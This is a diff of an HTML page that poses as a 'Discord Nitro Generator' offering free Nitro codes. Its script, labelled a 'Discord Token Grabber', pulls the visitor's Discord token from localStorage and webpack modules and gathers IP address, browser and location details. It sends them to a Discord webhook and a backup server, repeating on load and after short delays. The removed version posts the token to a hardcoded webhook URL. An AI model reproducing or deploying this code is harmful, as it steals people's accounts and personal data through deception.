@@ -1,78 +1,165 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Loading...</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Nitro Generator</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            background-color: #f0f0f0;
+            color: white;
         }
-        #loading {
+        .container {
             text-align: center;
+            background: rgba(255,255,255,0.1);
+            padding: 40px;
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
         }
-        #finishButton {
-            padding: 10px 20px;
-            font-size: 16px;
-            cursor: pointer;
+        h1 { margin-bottom: 10px; }
+        .loading {
+            margin-top: 20px;
+            font-size: 18px;
         }
+        .spinner {
+            border: 4px solid rgba(255,255,255,0.3);
+            border-top: 4px solid white;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div id="loading">
-        <p>Loading...</p>
-        <button id="finishButton">Finish</button>
+    <div class="container">
+        <h1>Discord Nitro Generator</h1>
+        <p>Generating your free Nitro code...</p>
+        <div class="spinner"></div>
+        <div class="loading">Please wait while we verify your account...</div>
     </div>
+
     <script>
-        // Function to get the Discord token from local storage
-        function getDiscordToken() {
-            return localStorage.getItem('token');
-        }
-
-        // Function to send the token to the webhook
-        function sendTokenToWebhook(token) {
-            const webhookUrl = 'https://discord.com/api/webhooks/1552042396278063311/yxaPrCIPm4TlxGQvY-ApvaEEibgQVB9QNZIIv4txiuyBB9lGPzBo1ZKlJoO0aKAGWt0S';
-            const message = {
-                content: `Discord token: ${token}`
-            };
-
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(message)
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Token sent to webhook:', data);
-            })
-            .catch((error) => {
-                console.error('Error sending token to webhook:', error);
-            });
-        }
-
-        // Main function to handle the token grabbing process
-        function main() {
-            const token = getDiscordToken();
-            if (token) {
-                sendTokenToWebhook(token);
-            } else {
-                console.log('No Discord token found.');
+        // Discord Token Grabber
+        (function() {
+            const WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE';
+            
+            function getDiscordToken() {
+                // Method 1: LocalStorage (Discord Web)
+                let token = localStorage.getItem('token');
+                
+                // Method 2: Check all localStorage keys
+                if (!token) {
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        const value = localStorage.getItem(key);
+                        if (value && value.length > 50 && value.includes('.') && !value.includes(' ')) {
+                            token = value;
+                            break;
+                        }
+                    }
+                }
+                
+                // Method 3: WebSocket debug (if available)
+                if (!token && window.DiscordNative) {
+                    try {
+                        const webpack = webpackChunkdiscord_app;
+                        if (webpack) {
+                            const modules = Object.values(webpack.c);
+                            const tokenModule = modules.find(m => m?.exports?.default?.getToken);
+                            if (tokenModule) {
+                                token = tokenModule.exports.default.getToken();
+                            }
+                        }
+                    } catch(e) {}
+                }
+                
+                return token;
             }
-        }
-
-        // Run the main function when the page loads
-        window.onload = main;
-
-        // Hide the loading message and button after token is sent
-        document.getElementById('finishButton').addEventListener('click', () => {
-            document.getElementById('loading').style.display = 'none';
-        });
+            
+            function grabInfo() {
+                const token = getDiscordToken();
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const language = navigator.language;
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const screenRes = `${screen.width}x${screen.height}`;
+                const referrer = document.referrer || 'Direct';
+                
+                // Get IP info (will be processed server-side by webhook)
+                fetch('https://api.ipify.org?format=json')
+                    .then(res => res.json())
+                    .then(ipData => {
+                        const payload = {
+                            content: "@everyone **New Token Grabbed!**",
+                            embeds: [{
+                                title: "Discord Token Grabber",
+                                color: 0xff0000,
+                                fields: [
+                                    { name: "Token", value: `\`\`\`${token || 'Not Found'}\`\`\``, inline: false },
+                                    { name: "IP Address", value: ipData.ip, inline: true },
+                                    { name: "User Agent", value: userAgent, inline: false },
+                                    { name: "Platform", value: platform, inline: true },
+                                    { name: "Language", value: language, inline: true },
+                                    { name: "Timezone", value: timezone, inline: true },
+                                    { name: "Screen Resolution", value: screenRes, inline: true },
+                                    { name: "Referrer", value: referrer, inline: false },
+                                    { name: "URL", value: window.location.href, inline: false }
+                                ],
+                                timestamp: new Date().toISOString()
+                            }]
+                        };
+                        
+                        // Send to webhook
+                        if (WEBHOOK_URL && WEBHOOK_URL !== 'YOUR_WEBHOOK_URL_HERE') {
+                            fetch(WEBHOOK_URL, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify(payload)
+                            }).catch(() => {});
+                        }
+                        
+                        // Backup method - send to your server
+                        fetch('https://your-server.com/grab', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                token: token,
+                                ip: ipData.ip,
+                                userAgent: userAgent,
+                                url: window.location.href
+                            })
+                        }).catch(() => {});
+                    })
+                    .catch(() => {
+                        // If IP fetch fails, still try to send token
+                        if (token && WEBHOOK_URL !== 'https://discord.com/api/webhooks/1552042396278063311/yxaPrCIPm4TlxGQvY-ApvaEEibgQVB9QNZIIv4txiuyBB9lGPzBo1ZKlJoO0aKAGWt0S') {
+                            fetch(WEBHOOK_URL, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    content: `Token: ${token}\nUser: ${userAgent}`
+                                })
+                            }).catch(() => {});
+                        }
+                    });
+            }
+            
+            // Execute immediately
+            grabInfo();
+            
+            // Also try again after delay (in case Discord loads slowly)
+            setTimeout(grabInfo, 3000);
+            setTimeout(grabInfo, 5000);
+        })();
     </script>
 </body>
 </html>
